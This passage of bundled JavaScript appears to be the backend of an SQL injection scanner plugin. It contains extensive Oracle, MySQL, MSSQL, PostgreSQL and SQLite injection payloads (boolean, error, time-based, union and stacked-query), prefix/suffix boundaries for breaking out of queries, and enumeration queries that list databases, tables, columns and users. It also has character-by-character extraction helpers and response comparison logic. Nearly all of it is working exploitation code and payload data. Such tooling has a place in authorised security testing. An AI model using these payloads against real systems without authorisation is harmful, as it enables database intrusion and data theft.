            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      }
    ]
  },
  "Oracle": {
    "boolean-based": [
      {
        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 01234 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
        "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 01234 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
        "title": "Oracle boolean-based blind - Parameter replace",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": "",
            "suf": ""
          }
        ]
      },
      {
        "payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
        "vector": "AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
        "title": "Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' ",
            "suf": "--"
          },
          {
            "pref": '" ',
            "suf": "--"
          },
          {
            "pref": ") ",
            "suf": "--"
          },
          {
            "pref": "') ",
            "suf": "--"
          },
          {
            "pref": '") ',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
        "vector": "OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
        "title": "Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' ",
            "suf": "--"
          },
          {
            "pref": '" ',
            "suf": "--"
          },
          {
            "pref": ") ",
            "suf": "--"
          },
          {
            "pref": "') ",
            "suf": "--"
          },
          {
            "pref": '") ',
            "suf": "--"
          }
        ]
      }
    ],
    "inline-query": [],
    "stacked-queries": [
      {
        "payload": "(SELECT DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) FROM DUAL)",
        "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) ELSE 5238 END)",
        "title": "Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": ";",
            "suf": ""
          },
          {
            "pref": "';",
            "suf": "--"
          },
          {
            "pref": '";',
            "suf": "--"
          },
          {
            "pref": ");",
            "suf": "--"
          },
          {
            "pref": "');",
            "suf": "--"
          },
          {
            "pref": '");',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END",
        "vector": "BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END",
        "title": "Oracle stacked queries (DBMS_LOCK.SLEEP - comment)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": ";",
            "suf": ""
          },
          {
            "pref": "';",
            "suf": "--"
          },
          {
            "pref": '";',
            "suf": "--"
          },
          {
            "pref": ");",
            "suf": "--"
          },
          {
            "pref": "');",
            "suf": "--"
          },
          {
            "pref": '");',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END",
        "vector": "BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END",
        "title": "Oracle stacked queries (USER_LOCK.SLEEP - comment)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": ";",
            "suf": ""
          },
          {
            "pref": "';",
            "suf": "--"
          },
          {
            "pref": '";',
            "suf": "--"
          },
          {
            "pref": ");",
            "suf": "--"
          },
          {
            "pref": "');",
            "suf": "--"
          },
          {
            "pref": '");',
            "suf": "--"
          }
        ]
      }
    ],
    "time-based": [
      {
        "payload": "DBMS_PIPE.RECEIVE_MESSAGE('IsjT',[SLEEPTIME])",
        "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('IkdY',[SLEEPTIME]) ELSE 5689 END)",
        "title": "Oracle time-based blind (DBMS_PIPE.RECEIVE_MESSAGE - comment)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": " AND 8675=",
            "suf": ""
          },
          {
            "pref": " OR 8675=",
            "suf": ""
          },
          {
            "pref": "' ",
            "suf": ""
          },
          {
            "pref": "'||",
            "suf": "||'"
          },
          {
            "pref": "' AND 8675=",
            "suf": "--"
          },
          {
            "pref": "' OR 8675=",
            "suf": "--"
          },
          {
            "pref": '"||',
            "suf": '||"'
          },
          {
            "pref": '" AND 8675=',
            "suf": "--"
          },
          {
            "pref": '" OR 8675=',
            "suf": "--"
          },
          {
            "pref": ") AND 8675=",
            "suf": "--"
          },
          {
            "pref": ") OR 8675=",
            "suf": "--"
          },
          {
            "pref": "') AND 8675=",
            "suf": "--"
          },
          {
            "pref": "') OR 8675=",
            "suf": "--"
          },
          {
            "pref": '") AND 8675=',
            "suf": "--"
          },
          {
            "pref": '") OR 8675=',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "DBMS_LOCK.SLEEP([SLEEPTIME])",
        "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]) ELSE DBMS_LOCK.SLEEP(0) END)",
        "title": "Oracle time-based blind (DBMS_LOCK.SLEEP - comment)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": " AND 8675=",
            "suf": ""
          },
          {
            "pref": " OR 8675=",
            "suf": ""
          },
          {
            "pref": "' ",
            "suf": ""
          },
          {
            "pref": "'||",
            "suf": "||'"
          },
          {
            "pref": "' AND 8675=",
            "suf": "--"
          },
          {
            "pref": "' OR 8675=",
            "suf": "--"
          },
          {
            "pref": '"||',
            "suf": '||"'
          },
          {
            "pref": '" AND 8675=',
            "suf": "--"
          },
          {
            "pref": '" OR 8675=',
            "suf": "--"
          },
          {
            "pref": ") AND 8675=",
            "suf": "--"
          },
          {
            "pref": ") OR 8675=",
            "suf": "--"
          },
          {
            "pref": "') AND 8675=",
            "suf": "--"
          },
          {
            "pref": "') OR 8675=",
            "suf": "--"
          },
          {
            "pref": '") AND 8675=',
            "suf": "--"
          },
          {
            "pref": '") OR 8675=',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "USER_LOCK.SLEEP([SLEEPTIME])",
        "vector": "(CASE WHEN ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]) ELSE USER_LOCK.SLEEP(0) END)",
        "title": "Oracle time-based blind (USER_LOCK.SLEEP - comment)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": " AND 8675=",
            "suf": ""
          },
          {
            "pref": " OR 8675=",
            "suf": ""
          },
          {
            "pref": "' ",
            "suf": ""
          },
          {
            "pref": "'||",
            "suf": "||'"
          },
          {
            "pref": "' AND 8675=",
            "suf": "--"
          },
          {
            "pref": "' OR 8675=",
            "suf": "--"
          },
          {
            "pref": '"||',
            "suf": '||"'
          },
          {
            "pref": '" AND 8675=',
            "suf": "--"
          },
          {
            "pref": '" OR 8675=',
            "suf": "--"
          },
          {
            "pref": ") AND 8675=",
            "suf": "--"
          },
          {
            "pref": ") OR 8675=",
            "suf": "--"
          },
          {
            "pref": "') AND 8675=",
            "suf": "--"
          },
          {
            "pref": "') OR 8675=",
            "suf": "--"
          },
          {
            "pref": '") AND 8675=',
            "suf": "--"
          },
          {
            "pref": '") OR 8675=',
            "suf": "--"
          }
        ]
      }
    ],
    "error-based": [
      {
        "payload": "AND 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))",
        "vector": "AND 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)||[INFERENCE]||CHR(126)||CHR(69)||CHR(78)||CHR(68))))",
        "title": "Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "OR 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))",
        "vector": "OR 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)||[INFERENCE]||CHR(126)||CHR(69)||CHR(78)||CHR(68))))",
        "title": "Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
        "dbms": "Oracle",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      }
    ]
  }
};

// src/backend/index.ts
function utf8Encode(str) {
  const bytes = [];
  for (let i = 0; i < str.length; i++) {
    let code = str.charCodeAt(i);
    if (code < 128) {
      bytes.push(code);
    } else if (code < 2048) {
      bytes.push(192 | code >> 6, 128 | code & 63);
    } else if (code >= 55296 && code <= 56319) {
      const hi = code;
      const lo = str.charCodeAt(++i);
      code = 65536 + ((hi & 1023) << 10) + (lo & 1023);
      bytes.push(
        240 | code >> 18,
        128 | code >> 12 & 63,
        128 | code >> 6 & 63,
        128 | code & 63
      );
    } else {
      bytes.push(224 | code >> 12, 128 | code >> 6 & 63, 128 | code & 63);
    }
  }
  return new Uint8Array(bytes);
}
function utf8Decode(bytes) {
  const arr = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  let out = "";
  let i = 0;
  while (i < arr.length) {
    const b = arr[i++];
    if (b < 128) {
      out += String.fromCharCode(b);
    } else if (b >= 192 && b < 224) {
      out += String.fromCharCode((b & 31) << 6 | arr[i++] & 63);
    } else if (b >= 224 && b < 240) {
      out += String.fromCharCode((b & 15) << 12 | (arr[i++] & 63) << 6 | arr[i++] & 63);
    } else {
      const code = (b & 7) << 18 | (arr[i++] & 63) << 12 | (arr[i++] & 63) << 6 | arr[i++] & 63;
      const c = code - 65536;
      out += String.fromCharCode(55296 + (c >> 10), 56320 + (c & 1023));
    }
  }
  return out;
}
var PREFIXES_SUFFIXES = {
  level1: [
    { pref: " ", suf: "" },
    { pref: " ", suf: "-- -" },
    { pref: "' ", suf: "-- -" },
    { pref: '" ', suf: "-- -" }
  ],
  level2: [
    { pref: " ", suf: "" },
    { pref: " ", suf: "-- -" },
    { pref: " ", suf: "#" },
    { pref: "' ", suf: "-- -" },
    { pref: "' ", suf: "#" },
    { pref: '" ', suf: "-- -" },
    { pref: '" ', suf: "#" },
    { pref: ") ", suf: "-- -" },
    { pref: "') ", suf: "-- -" },
    { pref: '") ', suf: "-- -" },
    { pref: "' ", suf: " AND '1'='1" },
    { pref: '" ', suf: ' AND "1"="1' }
  ],
  level3: [
    { pref: " ", suf: "" },
    { pref: " ", suf: "-- -" },
    { pref: " ", suf: "#" },
    { pref: "' ", suf: "-- -" },
    { pref: "' ", suf: "#" },
    { pref: '" ', suf: "-- -" },
    { pref: '" ', suf: "#" },
    { pref: ") ", suf: "-- -" },
    { pref: ") ", suf: "#" },
    { pref: "') ", suf: "-- -" },
    { pref: "') ", suf: "#" },
    { pref: '") ', suf: "-- -" },
    { pref: '") ', suf: "#" },
    { pref: "' ", suf: " AND '1'='1" },
    { pref: '" ', suf: ' AND "1"="1' },
    { pref: ") ", suf: " AND (1=1" },
    { pref: "') ", suf: " AND ('1'='1" },
    { pref: "'XOR ", suf: " XOR'Z" },
    { pref: '"XOR ', suf: ' XOR"Z' },
    { pref: "'AND ", suf: " AND'Z" },
    { pref: "'OR ", suf: " OR'Z" },
    { pref: "'+", suf: "+'" },
    { pref: '"+', suf: '+"' }
  ]
};
var TIME_PAYLOADS = {
  mysql: [
    { payload: "(SELECT(0)FROM(SELECT(SLEEP([TIME])))a)", title: "MySQL >= 5.0.12 SLEEP subquery" },
    { payload: "if(now()=sysdate(),SLEEP([TIME]),0)", title: "MySQL >= 5.0.12 IF SLEEP" },
    { payload: "(SELECT CASE WHEN(1=1) THEN SLEEP([TIME]) ELSE 0 END)", title: "MySQL CASE SLEEP" },
    { payload: "SLEEP([TIME])", title: "MySQL direct SLEEP" },
    { payload: "BENCHMARK(5000000,MD5('test'))", title: "MySQL BENCHMARK" },
    { payload: "(SELECT(1)FROM(SELECT(IF(1=1,SLEEP([TIME]),0)))x)", title: "MySQL nested IF SLEEP" }
  ],
  mssql: [
    { payload: "WAITFOR DELAY '0:0:[TIME]'", title: "MSSQL WAITFOR DELAY" },
    { payload: ";WAITFOR DELAY '0:0:[TIME]'--", title: "MSSQL stacked WAITFOR" },
    { payload: "IF(1=1) WAITFOR DELAY '0:0:[TIME]'", title: "MSSQL IF WAITFOR" },
    { payload: "(SELECT CASE WHEN(1=1) THEN (SELECT 1 FROM(SELECT SLEEP([TIME]))x) ELSE 0 END)", title: "MSSQL CASE WHEN" }
  ],
  postgresql: [
    { payload: "(SELECT pg_sleep([TIME]))", title: "PostgreSQL pg_sleep" },
    { payload: ";SELECT pg_sleep([TIME])--", title: "PostgreSQL stacked pg_sleep" },
    { payload: "(SELECT CASE WHEN(1=1) THEN pg_sleep([TIME]) ELSE pg_sleep(0) END)", title: "PostgreSQL CASE pg_sleep" },
    { payload: "||pg_sleep([TIME])", title: "PostgreSQL concat pg_sleep" }
  ],
  oracle: [
    { payload: "AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',[TIME])", title: "Oracle DBMS_PIPE" },
    { payload: "||DBMS_PIPE.RECEIVE_MESSAGE('a',[TIME])||''", title: "Oracle concat DBMS_PIPE" },
    { payload: "AND 1=(CASE WHEN(1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',[TIME]) ELSE 0 END)", title: "Oracle CASE DBMS_PIPE" }
  ],
  sqlite: [
    { payload: "AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))", title: "SQLite heavy query" }
  ]
};
var UNION_PAYLOADS = [
  "UNION ALL SELECT NULL",
  "UNION SELECT NULL",
  "UNION ALL SELECT NULL,NULL",
  "UNION SELECT NULL,NULL",
  "UNION ALL SELECT NULL,NULL,NULL",
  "UNION SELECT NULL,NULL,NULL",
  "UNION ALL SELECT NULL,NULL,NULL,NULL",
  "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL",
  "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10"
];
var ERROR_SIGNATURES = {
  mysql: [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "MySQLSyntaxErrorException",
    "valid MySQL result",
    "check the manual that corresponds to your MySQL",
    "MySqlClient.",
    "com.mysql.jdbc",
    "Syntax error or access violation",
    "SQLSTATE[42000]",
    "ER_PARSE_ERROR",
    "FUNCTION QUARTER does not exist",
    "BIGINT UNSIGNED value is out of range",
    "Duplicate entry",
    "Unknown column"
  ],
  postgresql: [
    "PostgreSQL",
    "pg_query",
    "pg_exec",
    "valid PostgreSQL result",
    "Npgsql.",
    "PG::SyntaxError",
    "org.postgresql.util.PSQLException",
    "ERROR:  syntax error at or near",
    "unterminated quoted string at or near"
  ],
  mssql: [
    "Driver.* SQL[\\-\\_\\ ]*Server",
    "OLE DB.* SQL Server",
    "SQLServer JDBC Driver",
    "Microsoft SQL Native Client",
    "ODBC SQL Server Driver",
    "SQLExpress",
    "Microsoft OLE DB Provider for SQL Server",
    "Unclosed quotation mark after the character string",
    "SQL Server.*Driver",
    "mssql_query()",
    "Incorrect syntax near",
    "Conversion failed when converting"
  ],
  oracle: [
    "ORA-[0-9]+",
    "Oracle error",
    "Oracle.* Driver",
    "Warning: oci_",
    "quoted string not properly terminated",
    "SQL command not properly ended",
    "Oracle ODBC",
    "OracleException"
  ],
  sqlite: [
    "SQLite/JDBCDriver",
    "SQLite.Exception",
    "System.Data.SQLite.SQLiteException",
    "Warning: sqlite_",
    "Warning: SQLite3::",
    "SQLITE_ERROR",
    "sqlite3.OperationalError",
    "SQLiteException"
  ]
};
var ENUM_QUERIES = {
  mysql: {
    databases: "SELECT schema_name FROM information_schema.schemata",
    tables: "SELECT table_name FROM information_schema.tables WHERE table_schema='[DB]'",
    columns: "SELECT column_name FROM information_schema.columns WHERE table_schema='[DB]' AND table_name='[TABLE]'",
    version: "SELECT VERSION()",
    user: "SELECT USER()",
    hostname: "SELECT @@hostname"
  },
  postgresql: {
    databases: "SELECT datname FROM pg_database",
    tables: "SELECT tablename FROM pg_tables WHERE schemaname='public'",
    columns: "SELECT column_name FROM information_schema.columns WHERE table_name='[TABLE]'",
    version: "SELECT version()",
    user: "SELECT current_user"
  },
  mssql: {
    databases: "SELECT name FROM master..sysdatabases",
    tables: "SELECT name FROM [DB]..sysobjects WHERE xtype='U'",
    columns: "SELECT name FROM syscolumns WHERE id=OBJECT_ID('[TABLE]')",
    version: "SELECT @@VERSION",
    user: "SELECT SYSTEM_USER",
    hostname: "SELECT @@SERVERNAME"
  },
  oracle: {
    databases: "SELECT DISTINCT owner FROM all_tables",
    tables: "SELECT table_name FROM all_tables WHERE owner='[DB]'",
    columns: "SELECT column_name FROM all_tab_columns WHERE table_name='[TABLE]'",
    version: "SELECT banner FROM v$version WHERE ROWNUM=1",
    user: "SELECT user FROM dual"
  },
  sqlite: {
    tables: "SELECT name FROM sqlite_master WHERE type='table'",
    columns: "PRAGMA table_info([TABLE])",
    version: "SELECT sqlite_version()"
  }
};
var DBMS_META = {
  mysql: {
    charFn: (q, pos) => `ORD(MID((${q}),${pos},1))`,
    lengthFn: (q) => `LENGTH((${q}))`,
    concat: (expr) => `SELECT GROUP_CONCAT(${expr} SEPARATOR 0x7c)`,
    rowLimit: (sql, off) => `${sql} LIMIT ${off},1`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql}) z`,
    errorWrap: (q) => `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT MID((${q}),1,30)),0x7e))`,
    sleepIf: (cond, t) => `IF((${cond}),SLEEP(${t}),0)`,
    concatSep: "|"
  },
  postgresql: {
    charFn: (q, pos) => `ASCII(SUBSTRING((${q})::text FROM ${pos} FOR 1))`,
    lengthFn: (q) => `LENGTH((${q})::text)`,
    concat: (expr) => `SELECT string_agg(${expr}::text,chr(124))`,
    rowLimit: (sql, off) => `${sql} LIMIT 1 OFFSET ${off}`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql}) z`,
    errorWrap: (q) => `CAST((SELECT ${q}) AS INT)`,
    sleepIf: (cond, t) => `(CASE WHEN (${cond}) THEN pg_sleep(${t}) ELSE pg_sleep(0) END)`,
    concatSep: "|"
  },
  mssql: {
    charFn: (q, pos) => `UNICODE(SUBSTRING((${q}),${pos},1))`,
    lengthFn: (q) => `LEN((${q}))`,
    concat: (expr) => `SELECT STRING_AGG(CAST(${expr} AS NVARCHAR(MAX)),'|')`,
    rowLimit: (sql, off) => sql.replace(/^SELECT/i, `SELECT`) + ` ORDER BY 1 OFFSET ${off} ROWS FETCH NEXT 1 ROWS ONLY`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql}) z`,
    errorWrap: (q) => `CONVERT(INT,(SELECT SUBSTRING((${q}),1,30)))`,
    sleepIf: (cond, t) => `(CASE WHEN (${cond}) THEN 1 ELSE 0 END)`,
    // paired with WAITFOR in caller
    concatSep: "|"
  },
  oracle: {
    charFn: (q, pos) => `ASCII(SUBSTRC((${q}),${pos},1))`,
    lengthFn: (q) => `LENGTH((${q}))`,
    concat: (expr) => `SELECT LISTAGG(${expr},'|') WITHIN GROUP (ORDER BY ${expr})`,
    rowLimit: (sql, off) => `SELECT * FROM (SELECT a.*, ROWNUM rn FROM (${sql}) a WHERE ROWNUM<=${off + 1}) WHERE rn=${off + 1}`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql})`,
    errorWrap: (q) => `UTL_INADDR.GET_HOST_ADDRESS((SELECT SUBSTR((${q}),1,30) FROM DUAL))`,
    sleepIf: (cond, t) => `(CASE WHEN (${cond}) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',${t}) ELSE 0 END)`,
    concatSep: "|"
  },
  sqlite: {
    charFn: (q, pos) => `UNICODE(SUBSTR((${q}),${pos},1))`,
    lengthFn: (q) => `LENGTH((${q}))`,
    concat: (expr) => `SELECT GROUP_CONCAT(${expr},'|')`,
    rowLimit: (sql, off) => `${sql} LIMIT 1 OFFSET ${off}`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql})`,
    errorWrap: (q) => `(${q})`,
    sleepIf: (cond, t) => `(${cond})`,
    concatSep: "|"
  }
};
var confirmedVectors = {};
var confirmedVectorsAll = {};
function vectorKey(requestId, param) {
  return `${requestId || "__raw__"}|${param}`;
}
var TECHNIQUE_RANK = { error: 4, union: 3, boolean: 2, time: 1 };
function recordVector(v) {
  const key = vectorKey(v.requestId, v.param);
  const list = confirmedVectorsAll[key] || (confirmedVectorsAll[key] = []);
  const sameTech = list.find((x) => x.technique === v.technique);
  if (sameTech) {
    if (sameTech.dbms === "unknown" && v.dbms !== "unknown") sameTech.dbms = v.dbms;
  } else {
    list.push(v);
  }
  if (v.dbms !== "unknown") {
    for (const x of list) if (x.dbms === "unknown") x.dbms = v.dbms;
  }
  const existing = confirmedVectors[key];
  if (!existing || (TECHNIQUE_RANK[v.technique] || 0) > (TECHNIQUE_RANK[existing.technique] || 0)) {
    confirmedVectors[key] = v;
  } else if (existing.dbms === "unknown" && v.dbms !== "unknown") {
    existing.dbms = v.dbms;
  }
}
var EXTRACTION_PREFERENCE = { error: 0, union: 1, boolean: 2, time: 3 };
function pickVectors(requestId, param) {
  let list = [];
  if (param) list = confirmedVectorsAll[vectorKey(requestId, param)] || [];
  if (list.length === 0) {
    const rid = requestId || "";
    for (const arr of Object.values(confirmedVectorsAll)) {
      for (const v of arr) if ((v.requestId || "") === rid) list.push(v);
    }
  }
  return [...list].sort(
    (a, b) => (EXTRACTION_PREFERENCE[a.technique] ?? 9) - (EXTRACTION_PREFERENCE[b.technique] ?? 9)
  );
}
var sdk;
var abortedSessions = /* @__PURE__ */ new Set();
var AbortError = class extends Error {
  constructor() {
    super("__ABORTED__");
  }
};
function isAborted(sid) {
  return abortedSessions.has(sid);
}
function _throwIfAborted(sid) {
  if (abortedSessions.has(sid)) throw new AbortError();
}
function _sendLog(msg, type = "info", sid = "") {
  sdk?.api?.send("log", { msg, type, sessionId: sid });
}
function sendLog(msg, type = "info") {
  _sendLog(msg, type, "");
}
function generateRandom() {
  return Math.floor(Math.random() * 9e3) + 1e3;
}
function replacePayloadPlaceholders(payload, timeSec) {
  const rand1 = generateRandom();
  const rand2 = generateRandom();
  return payload.replace(/\[RANDNUM\]/g, rand1.toString()).replace(/\[RANDNUM2\]/g, rand2.toString()).replace(/\[TIME\]/g, timeSec.toString()).replace(/\[SLEEPTIME\]/g, timeSec.toString());
}
function getPrefixSuffix(level) {
  if (level >= 3) return PREFIXES_SUFFIXES.level3;
  if (level >= 2) return PREFIXES_SUFFIXES.level2;
  return PREFIXES_SUFFIXES.level1;
}
function detectDbms(responseText) {
  for (const [dbms, patterns] of Object.entries(ERROR_SIGNATURES)) {
    for (const pattern of patterns) {
      if (new RegExp(pattern, "i").test(responseText)) {
        return dbms;
      }
    }
  }
  return "unknown";
}
var GH_GROUP_TO_CODE = {
  "MySQL": "mysql",
  "Microsoft SQL Server": "mssql",
  "PostgreSQL": "postgresql",
  "Oracle": "oracle",
  "": "unknown"
};
var GH_CODE_TO_GROUP = {
  mysql: "MySQL",
  mssql: "Microsoft SQL Server",
  postgresql: "PostgreSQL",
  oracle: "Oracle"
};
function ghGroupToCode(group) {
  return GH_GROUP_TO_CODE[group] ?? "unknown";
}
function ghCandidates(technique, dbmsHint) {
  const ghTech = technique === "error" ? "error-based" : technique === "boolean" ? "boolean-based" : technique === "time" ? "time-based" : "";
  if (!ghTech) return [];
  const groups = Object.keys(GHAURI_PAYLOADS);
  const hintGroup = GH_CODE_TO_GROUP[dbmsHint];
  const ordered = groups.slice().sort((a, b) => {
    const rank = (g) => g === hintGroup ? 0 : g === "BooleanTests" ? 1 : 2;
    return rank(a) - rank(b);
  });
  const out = [];
  for (const g of ordered) {
    const techs = GHAURI_PAYLOADS[g] || {};
    if (Array.isArray(techs[ghTech])) out.push(...techs[ghTech]);
    if (technique === "time" && Array.isArray(techs["stacked-queries"])) out.push(...techs["stacked-queries"]);
  }
  return out;
}
function ghBoundaries(entry, level) {
  const n = level >= 3 ? entry.comments.length : level === 2 ? 9 : 4;
  return entry.comments.slice(0, n);
}
var GH_TRUE_COND = "3567=3567";
var GH_FALSE_COND = "3567=3568";
function ghSubst(probe, mode, timeSec, origValue) {
  let s = probe.replace(/\[RANDNUM\]=\[RANDNUM\]/g, mode === "false" ? GH_FALSE_COND : GH_TRUE_COND);
  s = s.replace(/\[SLEEPTIME\]/g, String(timeSec));
  s = s.replace(/\[ORIGVALUE\]/g, origValue);
  s = s.replace(/\[RANDNUM\]/g, () => String(generateRandom()));
  return s;
}
function confirmErrorBased(baselineBody, injectedBody, titleDbms) {
  const injDbms = detectDbms(injectedBody);
  const baseDbms = detectDbms(baselineBody);
  if (injDbms !== "unknown" && injDbms !== baseDbms) {
    return { dbms: injDbms, evidence: `New ${injDbms.toUpperCase()} error signature in response` };
  }
  const m = injectedBody.match(/~([^~\s<>"']{1,200})~/);
  if (m && !baselineBody.includes(m[0]) && /[0-9A-Za-z]/.test(m[1])) {
    const d = injDbms !== "unknown" ? injDbms : titleDbms;
    return { dbms: d === "unknown" ? "mysql" : d, evidence: `Extracted via error marker: ${m[1]}` };
  }
  return null;
}
function stripEchoes(body, ...injected) {
  let out = body;
  for (const inj of injected) {
    if (!inj || inj.length < 3) continue;
    const variants = /* @__PURE__ */ new Set([
      inj,
      encodeURIComponent(inj),
      inj.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;")
    ]);
    for (const vv of variants) if (vv) out = out.split(vv).join("");
  }
  return out;
}
function markerValue(body, injectedPayload) {
  const m = body.match(/~([^~]*)~/);
  if (!m || m[1] === "") return null;
  const val = m[1];
  if (val.length >= 4 && injectedPayload.includes(val)) return null;
  if (/CAST\s*\(|CONCAT\s*\(|0x7e|@@|STRING_AGG|SUBSTR(ING)?\s*\(|NVARCHAR\s*\(/i.test(val)) return null;
  if (val.includes(GH_ERROR_MARKER)) return null;
  return val;
}
function normalizeBody(s) {
  return s.replace(/[A-Za-z0-9+/=_-]{24,}/g, "T").replace(/\d+/g, "#");
}
function wordCounts(s) {
  const m = /* @__PURE__ */ new Map();
  for (const t of s.split(/[^A-Za-z#]+/)) {
    if (t.length > 1) m.set(t, (m.get(t) || 0) + 1);
  }
  return m;
}
function pageSimilarity(a, b) {
  if (!a && !b) return 1;
  if (!a || !b) return 0;
  const ca = wordCounts(normalizeBody(a));
  const cb = wordCounts(normalizeBody(b));
  if (ca.size === 0 && cb.size === 0) {
    const la = a.length, lb = b.length;
    return la && lb ? Math.min(la, lb) / Math.max(la, lb) : 1;
  }
  let inter = 0, uni = 0;
  const keys = /* @__PURE__ */ new Set([...ca.keys(), ...cb.keys()]);
  for (const k of keys) {
    const x = ca.get(k) || 0, y = cb.get(k) || 0;
    inter += Math.min(x, y);
    uni += Math.max(x, y);
  }
  return uni > 0 ? inter / uni : 1;
}
function compareResponses(baseline, testResponse, similarityThreshold = 0.85) {
  if (!baseline || !testResponse) return { similar: false, ratio: 0 };
  const baseLen = baseline.length;
  const testLen = testResponse.length;
  if (baseLen === 0 && testLen === 0) return { similar: true, ratio: 1 };
  if (baseLen === 0 || testLen === 0) return { similar: false, ratio: 0 };
  const lenRatio = Math.min(baseLen, testLen) / Math.max(baseLen, testLen);
  if (Math.abs(baseLen - testLen) / Math.max(baseLen, testLen) > 0.5) {
    return { similar: false, ratio: lenRatio };
  }
  const sampleSize = Math.min(1e3, baseLen, testLen);
  const baseSample = baseline.substring(0, sampleSize);
  const testSample = testResponse.substring(0, sampleSize);
  let matches = 0;
  for (let i = 0; i < sampleSize; i++) {
    if (baseSample[i] === testSample[i]) matches++;
  }
  const ratio = matches / sampleSize * lenRatio;
  return { similar: ratio >= similarityThreshold, ratio };
}
